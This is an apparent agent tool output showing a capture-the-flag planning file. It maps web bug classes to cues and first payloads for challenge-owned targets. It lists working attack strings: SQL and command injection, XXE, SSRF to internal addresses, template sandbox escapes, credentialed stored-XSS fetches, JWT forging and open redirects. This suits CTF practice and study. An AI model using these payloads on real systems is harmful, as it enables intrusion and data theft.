{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_011kHWbQXdcAxDkk3RJP59VU","type":"tool_result","content":"1\t# Web coverage atlas\n2\t\n3\tLane: a LIVE challenge-owned target per question (`targets[{id:\"Target N\", url}]`, no artifact), one `proof-N`\n4\tquestion per target, answer = the token `proof_<32 hex>` the app prints once the bug is exploited (`trim`). One\n5\tclassic bug per lane-day, named by a title pun: D01 exposed backup, D02 IDOR, D03 SQLi (paren-wrapped LIKE), D04 path\n6\ttraversal to `/run/huntress/objective.txt`, D05 unprotected feature route, D06 reflected XSS (server-judged \"isolated\n7\tcallback\"), D07 stored XSS (real moderator bot), D08 session fixation, D09 CSRF (server-judged by\n8\t`Sec-Fetch-Site: cross-site`), D10 unrestricted upload rendered by a `{{field}}` template preview, D11 SSTI\n9\t(`?template={{objective}}`), D12 second-order SQLi (JSON plant, delayed reader), D13 mass assignment (privilege keys\n10\tbound from a JSON profile update). Since D05 every target is the same kit: `/api/clues` names `feature_route`, often\n11\t`secondary_route` (or `render_route`/`preferences_route`), `current_role: analyst` + zero or one concept key\n12\t(`callback_nonce`, `moderator_data_route`/`receipt_route_template`, `session_hint`, `preview_guide`/`upload_policy`/\n13\t`upload_shape`). D11-D13 had NO concept key: the prompt and the bare-route errors (`post_required` 405,\n14\t`administrator_required` 403, an empty \"Rendered message\" `<pre>`) were the routing signal. Stated policies and\n15\techoes are costume (D09 token, D10 type rule, D13 echo hid the bound role). Success = proof regex, never `effect`\n16\talone (D12 prints its effect with empty rows). Mastery = today's bug + earlier lane-days (3 targets since D08),\n17\tdescribed only by today's prompt. Pace: D01-D03 cal. 19, D04-D05 cal. 20, D06-D08 cal. 21, D09-D10 cal. 22, D11-D13\n18\tcal. 23 -> D14-D31 (18 lane-days) over cal. 24-31, ~2-3 per day; priority 1 below = likely in D14-D21.\n19\tArc: info-disclosure -> access control -> injection -> file read -> access control -> XSS (reflected, stored) ->\n20\tsession fixation -> CSRF -> upload -> SSTI -> second-order SQLi -> mass assignment. Server-side/API run since D10,\n21\teach a classic OWASP item, several \"one level deeper\" sequels of earlier days (D10->D11 templates, D03->D12 SQLi,\n22\tD05->D13 authz). Still missing classics, most likely next: OS command injection, SSRF, XXE, JWT / signed-cookie\n23\tforgery, role via cookie/header, open redirect, DOM XSS; then deserialization, prototype pollution, NoSQL, race,\n24\tCORS, header trust, GraphQL, password reset, cache poisoning.\n25\tSnapshot 2026-10-23 (after D13). `lib/web/handlers/__init__.py` holds `session_fixation`, `upload`, `csrf` (+\n26\t`default` ladder) and loads per-day plugins `lib/web/handlers/dayNN_*.py` (each exports `KEY_MAP` + `HANDLERS`; D23\n27\tadded `template_temper` SSTI, `ask_again_later` second-order, `posted_too_much` mass assignment). `hctf prebuild`\n28\tstill has NO `web` lane and no `web:*` keys exist in `.run/prebuild-state.json` -> every prebuild gap is pending.\n29\t\n30\tStatus legend: `seen Dnn` = GM-confirmed lane-day (solver in `challenges/<cal-day>/web-*/solver/solve.py`, handler in\n31\t`lib/web/handlers/`). `gap` = nothing reusable in lib. Prebuilt web modules must be PURE (no `urllib.request`): bodies\n32\tin -> request plan `[(method, path, headers, body)]` out; response in -> proof or next hints. The solver fetches.\n33\t\n34\t## Coverage table\n35\t\n36\t| # | concept | status | recognition cues | first move | likelihood next 3 cal. days |\n37\t|---|---|---|---|---|---|\n38\t| 1 | exposed backup / forced browsing via robots | seen D01 (Mastery x3) | robots `Disallow: /<word>-<hex>/`, \"crawler policy\", \"archive\" | robots -> index -> every link (depth 2) | done; Mastery |\n39\t| 2 | IDOR (object-level authz) | seen D02 (Mastery x2) | \"Signed in as\", `/<things>/<id>`, `fetch('/api/<things>/'+id)` | foreign ids from `/api/history` | done; Mastery |\n40\t| 3 | SQL injection (tautology) | seen D03 | search form, \"database\", \"one pointed question\" | `zz') OR 1=1 --` family + quote-balanced | done; Mastery |\n41\t| 3b | second-order SQLi (stored value queried later) | seen D12 | \"plant your question inside the data and come back later\", \"delayed echo\", feature 405 `post_required`, secondary `{\"rows\":[],\"effect\":..}` | POST JSON every field = `x' OR '1'='1' -- `, GET secondary; `rows[]` holds proof | done; Mastery |\n42\t| 4 | path traversal / LFI | seen D04 (Mastery) | `?doc=`/`?page=` filename value, \"mounted at /path\" | `../`*10 + prompt path | done; Mastery |\n43\t| 5 | missing function-level authz (unlinked route) | seen D05 (Mastery) | \"staff-only, just a sign\", clue `feature_route` | GET the clue route | done; Mastery |\n44\t| 6 | role / privilege via client-controlled header, query or cookie | gap | `current_role: analyst` in every clue JSON, `role=` cookie, `X-Role` in errors | flip the value the app names | high (D13 did the body form) |\n45\t| 7 | JWT tampering (`alg:none`, leaked HS256 secret, kid/jku) | gap | 3 base64url parts in cookie / `Authorization` | decode; resign with `none` / leaked secret | high |\n46\t| 8 | signed-cookie / session forgery (Flask, Express `s:`, base64 JSON) | gap | `session=eyJ...`, `s%3A`, base64 JSON cookie | decode; re-sign with a leaked secret | high |\n47\t| 9 | mass assignment / over-posting | seen D13 | \"the form only asked for your name. But the API binds whatever you hand it\", \"promotion\", feature 405 `post_required`, secondary 403 `administrator_required` | POST JSON `display_name` + role/is_admin/isAdmin/admin/roles/access_level/permissions, GET secondary | done; Mastery |\n48\t| 10 | OS command injection | gap | \"ping\", \"lookup host\", \"diagnostics\", \"shell\" | `;cat /run/huntress/objective.txt`, `|`, `$()`, `%0a` | very high |\n49\t| 11 | SSTI (expression in a rendered message) | seen D11 | \"template engine ... evaluates everything\", \"speak in expressions\", \"Rendered message\" `<pre>` | `?template={{7*7}}` -> 49, then `{{objective}}` | done; Mastery |\n50\t| 11b | SSTI sequels: sandbox escape / file read / stored template | gap | `{{objective}}` absent or filtered, \"sandbox\", \"safe mode\", stored profile rendered later | engine fingerprint -> per-engine file read of prompt path | med |\n51\t| 12 | SSRF | gap | \"fetch URL\", \"preview link\", \"webhook\", \"import\" | `http://127.0.0.1/<clue route>`, `file:///run/...` | very high |\n52\t| 13a | reflected XSS (server-judged callback) | seen D06 | \"repeats everything\", \"talks back\", clue `callback_nonce` | reflect `<script>fetch(cb?nonce)`, then GET cb with Sec-Fetch-* + Referer | done; Mastery |\n53\t| 13b | stored XSS (moderator bot) | seen D07 | \"guestbook\", \"reviewer stops by\", `moderator_data_route`, `receipt_route_template` | store fetch(data)->POST receipt script; poll entry | done; Mastery |\n54\t| 13c | DOM XSS (`location.hash`/`search` -> `innerHTML`/`eval`) | gap | inline JS reading location, \"client-side\", \"nothing reaches the server\" | scan sinks; bot visits `#payload` URL or callback check | high |\n55\t| 14 | default / leaked credentials login | gap | login form, creds in comment / backup / JS | use the leaked pair (no brute force) | med |\n56\t| 15 | header-trust bypass (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`) | gap | \"internal only\", \"localhost only\" | spoof the header the error names | med-high |\n57\t| 16 | HTTP verb / method-override tampering | gap | 405/403 on GET, `_method=` | other methods + overrides | med |\n58\t| 17 | path-normalisation authz bypass | gap | 403 on a named route | `/ADMIN`, `//admin`, `/admin;/`, `%2e` | med |\n59\t| 18 | XXE | gap | XML/SVG/DOCX upload, `application/xml`, `upload_shape` naming xml | entity on `file:///run/huntress/objective.txt` | high |\n60\t| 19 | NoSQL injection | gap | JSON login, \"MongoDB\", \"document store\" | `{\"$ne\":null}` | med-high |\n61\t| 20 | unrestricted upload rendered server-side | seen D10 (Mastery) | \"upload form has standards. Low ones\", `upload_shape`, `render_route`, `preview_guide` | POST JSON `{filename:x.html, content:<p>{{objective}}</p>, content_type:text/html}` -> GET returned `path` | done; Mastery |\n62\t| 20b | upload filter bypass / served-path traversal / stored SVG-HTML XSS | gap | policy enforced (`extension_not_allowed`, magic check), `../` in filename | double ext, case, magic+type spoof, `../` filename, SVG script | med |\n63\t| 21 | insecure deserialization | gap | cookie `gASV`/`Tzo`/`rO0`/`_$$ND_FUNC$$_` | tamper fields, then gadget | med |\n64\t| 22 | exposed VCS / env / debug | gap | `/.git/HEAD` 200, `/.env`, DEBUG page | fetch, reconstruct, read secret | med |\n65\t| 23 | GraphQL introspection / hidden field | gap | `/graphql`, `{\"data\":` | `__schema`, hidden fields | med |\n66\t| 24a | CSRF (state change \"as someone else\") | seen D09 | \"obeys whoever asks nicely -- even strangers\", `preferences_route`, form with hidden `csrf_token` | submit the form's external option cross-site (Sec-Fetch-*), read `/api/preferences` | done; Mastery |\n67\t| 24e | CSRF sequels: token bound/checked, SameSite, JSON-body CSRF via bot | gap | token rejected when absent, `SameSite=Strict`, report-to-admin URL | token from own session, text/plain JSON form, GET downgrade | low-med |\n68\t| 24b | open redirect (incl. OAuth `redirect_uri`) | gap | `?next=`/`?return=`/`redirect_uri`, \"after login\" | redirect to a clue route / `//host`; effect JSON | high |\n69\t| 24c | CORS misconfig (reflected Origin + credentials) | gap | `Access-Control-Allow-Origin` echoing Origin, `-Credentials: true` | request with `Origin: null` / attacker | med |\n70\t| 24d | clickjacking / framing | gap | no X-Frame-Options/CSP frame-ancestors, \"one click\" | effect likely judged server-side by headers | low |\n71\t| 25 | prototype pollution (Node) | gap | JSON merge \"settings\", Node/Express/NestJS banner | `{\"__proto__\":{\"isAdmin\":true}}` | med-high (D13 sibling) |\n72\t| 26 | race condition / business logic | gap | shop / wallet / voucher, \"only once\", \"at the same time\" | parallel burst, negative values | med |\n73\t| 27 | password-reset / predictable token / OTP | gap | \"forgot password\", token in response | read the leaked token; no brute force | med |\n74\t| 28 | UNION / error / blind (boolean, time) SQLi | gap | numeric id, DB errors, \"only yes or no\", \"takes its time\" | `ORDER BY`, `UNION SELECT`, boolean diff | med |\n75\t| 29 | LFI filters | partial (D04 payload set) | \"not allowed\", `.php` appended | `....//`, double-encode, `pages/../`, wrappers | med |\n76\t| 30 | request smuggling / cache poisoning / host header | gap | proxy + cache headers, reset links using Host | `X-Forwarded-Host`, CL/TE | low |\n77\t| 31 | session fixation (planted id adopted by victim login) | seen D08 | \"plant your session\", \"welcome mat\", clue `session_hint` | `?sid=<hint>` on feature route -> cookie on secondary | done; Mastery |\n78\t| 32 | session hijack / weak session ids / logout not invalidating | gap | sequential or timestamp ids, ids leaked in URLs/logs | reuse a leaked id the app shows | med |\n79\t| 33 | static web evidence (HAR, pcap, logs, web shell) | gap (never released) | `.har`, pcap magic, combined-log lines | jq / tshark / decode layers | low |\n80\t| 34 | type juggling / loose comparison / JSON type confusion | gap | PHP/Node costume, `==` compare of token/PIN, JSON login | `true`, `0`, `[]`, `{\"$gt\":\"\"}`, `\"0e1\"` | med |\n81\t| 35 | HTTP parameter pollution / duplicate keys | gap | same param twice, proxy + app split, \"first one wins\" | `a=1&a=2`, duplicate JSON keys, array params | low-med |\n82\t| 36 | excessive data exposure / field-filter read (BOPLA read) | gap | API list returning more than the page shows, `?fields=`, `include=`, `expand=` | request hidden fields / `?fields=*` | med |\n83\t| 37 | second-order sequels for other classes (stored SSTI / XSS / cmd read later) | gap | \"save now, rendered later\", profile shown on another page | plant per-class payload, read the secondary | med (D12 pattern) |\n84\t\n85\t## Recognition cues (worker quick-reference)\n86\t\n87\t```\n88\tFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n89\t  GET /api/clues   -> feature_route / secondary_route / current_role + ZERO or ONE concept key\n90\t  GET each clue route BARE: the JSON error names the missing piece (session_id_required, authenticated_login_required,\n91\t      browser_callback_required, post_required(405) = a POST sink, administrator_required(403) = privilege check)\n92\t  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n93\t  regex  proof_[0-9a-f]{32}  over EVERY body (JSON/base64/zip decoded). An `effect` without the proof is NOT a solve.\n94\t  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = not ready, re-poll hctf status.\n95\tPick routes by clue KEY (feature_/secondary_/*_data_route/*_template) and openapi paths, NEVER by the word in the\n96\tvalue (callback|internal|status|result|audit, messages|postcards are re-dealt even between single and TT).\n97\tNo concept key (D11-D13) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\n98\tMASTERY: 3 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged.\n99\t\n100\tCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\n101\trobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n102\t\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\n103\tsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n104\t?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\n105\tfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\n106\tcallback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then\n107\t      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\n108\tmoderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n109\t  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\n110\tsession_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\n111\tpreferences_route, form + hidden csrf_token,           -> CSRF (D09)         -> submit the form's external option with Sec-Fetch-Site:\n112\t  \"obeys whoever asks nicely -- even strangers\"             cross-site, Mode: navigate, Dest: document, foreign Referer; GET /api/preferences\n113\tupload_shape/render_route/preview_guide                -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n114\t  \"upload form has standards. Low ones\"                     content_type:\"text/html\"} -> GET the returned path\n115\t\"template engine evaluates\", \"speak in expressions\",   -> SSTI (D11)         -> feature?template=a${7*7}b{{7*7}}c (one probe per param:\n116\t  empty \"Rendered message\" <pre>                            template|message|q|name|text) -> {{objective}} in the family that gave 49\n117\t\"plant ... come back later\", \"delayed echo\",           -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"} (also\n118\t  feature post_required, secondary {\"rows\":[]}               \"zz' OR 1=1 --\"), GET secondary after each plant -> rows[] has proof\n119\t\"API binds whatever you hand it\", \"promotion\",         -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n120\t  feature post_required, secondary administrator_required    admin, roles:[\"admin\"], access_level, permissions}; GET secondary\n121\tcurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin (cookie, header, claim)\n122\teyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\n123\tlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n124\t?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n125\t\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\n126\t\"fetch URL\", \"webhook\", \"import\"                      -> SSRF               -> http://127.0.0.1/<clue route>, file:///run/...\n127\t\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\n128\tXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\n129\t\"__proto__\", JSON merge \"settings\", Node banner        -> prototype pollution -> {\"__proto__\":{\"isAdmin\":true}} then re-read secondary\n130\tA real victim browser exists (D07): anything \"the admin/reviewer visits\" can run your JS with their cookies; receipts\n131\tcan land >12 s later. \"Browser\"/\"stranger\" checks without a bot (D06, D09) = send the Sec-Fetch-* + Referer/Origin\n132\tmatrix yourself. NEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11\n133\tdid -> TT first try; D09, D10, D12, D13 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n134\t```\n135\t\n136\t## Readiness gaps\n137\t\n138\tPriority 1 = plausible within ~3 calendar days (~6-9 lane-days at the current pace). \"prebuild\" = pure python handler\n139\t(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\n140\tdecoy. \"note\" = harness/prompt change. \"tool\" = install. None built (no web prebuild lane). Dropped after D13:\n141\t`ssti-engine-probe` (seen D11), `port-day22-handlers` (csrf/upload now in lib/web/handlers); mass assignment (seen\n142\tD13) removed from `role-tamper-planner`, second-order SQLi (seen D12) from `sqli-union-blind`.\n143\t\n144\t```json\n145\t[\n146\t  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Still true after D13: hctf/prebuild.py LANES has no `web` entry (AUTO_LANES lists 5 lanes) and .run/prebuild-state.json has no web:* keys, so no prebuild gap below can drain. lib/web/handlers/ already loads per-day plugins `dayNN_*.py` exporting KEY_MAP + HANDLERS (D23 added three) -> the writable target is a new plugin file per gap, e.g. lib/web/handlers/prebuilt_<id>.py, + tests/data/web_fixtures/. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web/handlers/prebuilt_, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web/handlers/__init__.py:_load_plugins,)}`. Fixtures = saved target responses (targets 410 after CORRECT).\"},\n147\t  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D23: D12 and D13 TT returned solver_incomplete (41 s, 12.9 s; solve.py a stub / no handler) because the orchestrator started TT ~1 min after single CORRECT while the codify worker was still writing lib/web/handlers/day23_*.py; the live worker then hand-solved. D11's single worker wrote its plugin BEFORE submitting -> TT CORRECT first try (solve 5.2 s). Owner of hctf/ + web skill: for web, gate TT start on the codify worker (or on solver-test passing the single case), and tell the single worker to write the plugin handler (KEY_MAP + HANDLERS, generic over param/field/route words) before `hctf submit`.\"},\n148\t  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each flagged param (host, ip, target, domain, filename, cmd): separators ; | || && %0a $() backticks, with/without a valid prefix (127.0.0.1), reading the prompt path (default /run/huntress/objective.txt) via cat, `$(cat ...)` echoed, `${IFS}` space bypass. Parser: proof regex in response / tool output block.\"},\n149\t  {\"id\": \"ssrf-planner\", \"concept\": \"server-side request forgery (row 12)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"URL-taking params (url, link, src, webhook, feed, image, callback). Plan: file:///run/huntress/objective.txt, http://127.0.0.1 / localhost / 0.0.0.0 / [::1] / 2130706433 / 127.1 + the clue routes (secondary_route is often the 'internal' one), named internal ports, 169.254.169.254 only if named, redirect and @-userinfo allowlist bypasses. Parser: proof regex in the preview body.\"},\n150\t  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n151\t  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Session family opened on D08. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (clues, backups, .env, JS, comments), RS256->HS256 with a published public key (jwks.json). Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1) re-signed with a leaked secret. Escalate role/admin/sub (current_role analyst -> admin). No secret brute force beyond what the app leaks.\"},\n152\t  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON still shows current_role: analyst; D13 granted admin via JSON body binding (mass assignment, seen) -- the sibling forms are untested. From recon: role field and values (current_role, role, is_admin, group, tier), app-set cookies, headers named in clues/errors. Plan: cookie role=<admin|administrator|staff|owner|higher listed value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role=admin / ?admin=1, PATCH/PUT of the profile route with the D13 privilege key set. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n153\t  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n154\t  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n155\t  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + bare-route JSON errors + prompt verbs to the concept and the next request\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs. Add D09: preferences_route (+ form with hidden csrf_token) -> CSRF handler (cross-site fetch-metadata submit, then GET /api/preferences); D10: upload_shape / render_route / preview_guide / upload_policy -> upload handler (POST JSON html with {{objective}}, GET returned path). Both handlers exist in challenges/day22/web-*/solver/solve.py (csrf(), upload()). Errors: signed_in_session_required, invalid_destination, method_not_allowed, file_not_found. D11-D13 had NO concept key, so add a second stage: bare GET of each route -> `post_required` (405: POST sink -> second-order / mass-assignment / injection by body), `administrator_required` (403 on secondary: privilege bound elsewhere), empty `Rendered message <pre>` (render sink -> SSTI probe on ?template=), plus prompt verbs (\\\"binds whatever you hand it\\\" -> mass assignment, \\\"plant ... come back later\\\" -> second-order, \\\"evaluates everything\\\" -> SSTI). Plugins: lib/web/handlers/day23_web_template_temper.py, day23_web_ask_again_later.py, day23_web_posted_too_much.py.\"},\n156\t  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web.py: concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one.\"},\n157\t  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n158\t  {\"id\": \"fetch-metadata-matrix\", \"concept\": \"server-judged 'browser' checks: Sec-Fetch-* / Referer / Origin matrix (rows 13a, 24a, 15)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D06 (same-origin callback) and D09 (cross-site CSRF) were both judged purely by request headers, no bot. Pure planner: given a route, a base URL and an optional 'from' page URL, emit header sets {Sec-Fetch-Site: same-origin|same-site|cross-site|none} x {Mode: navigate|cors|no-cors} x {Dest: document|empty|iframe} with matching Referer (from-page / foreign https://evil.example/ / none) and Origin (base / foreign / null), ordered by the error/flag the app returned (browser_callback_required -> same-origin cors; changed_across_sites:false -> cross-site navigate). Parser: evidence/proof regex + boolean flags in the JSON. Fixtures: D06 callback and D09 /api/preferences bodies from day21/day22 logs.\"},\n159\t  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n160\t  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},\n161\t  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets). D13 (NestJS mass assignment) makes the JSON-merge sibling more likely: after the pollution POST, GET secondary_route (administrator_required) and look for evidence.\"},\n162\t  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},\n163\t  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies gASV/gAN (pickle), Tzo/YTo (PHP), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Prefer data tampering (isAdmin/role) over code execution; minimal gadget reading the prompt path otherwise.\"},\n164\t  {\"id\": \"ssti-sandbox-escape\", \"concept\": \"SSTI sequels: filtered/sandboxed engine, file read, stored template (row 11b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D11 rendered `{{objective}}` directly (context var) under a Spring Boot costume; `{{T(java.lang.Runtime)}}` printed a class, ${..}/*{..} stayed literal. A sequel may hide `objective` or filter `{{`. Planner: fingerprint by arithmetic family ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {{7*'7'}} -> 7777777 Jinja2 / 49 Twig), then per-engine reads of the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / lipsum / request.application, Twig source() / _self.env, SpEL T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/run/huntress/objective.txt')), Freemarker ?new() / ?api, ERB File.read, EJS/Nunjucks/Handlebars constructor chains, Thymeleaf __${..}__::. Filter bypasses: attr()/|join, hex/unicode, request.args indirection. Also plant in stored fields read later (row 37). Parser: proof regex in rendered body.\"},\n165\t  {\"id\": \"stored-second-order-generic\", \"concept\": \"plant now, read on another route: second-order for any class (row 37)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D12 pattern generalised: feature_route = POST sink (`post_required`, `saved:true`), secondary_route = later reader. Planner takes a per-class payload list (SQLi ladder, SSTI `{{objective}}`/`${..}`, cmd `;cat <prompt path>`, XSS for a bot) and plants each as JSON (then form) in every common field (name,q,query,note,label,title,value,filter,search,term,report,display_name,bio,comment,message) in one body, re-GETs every reader route after EACH plant. Parser: proof regex only (D12 prints `effect` even when rows are empty).\"},\n166\t  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 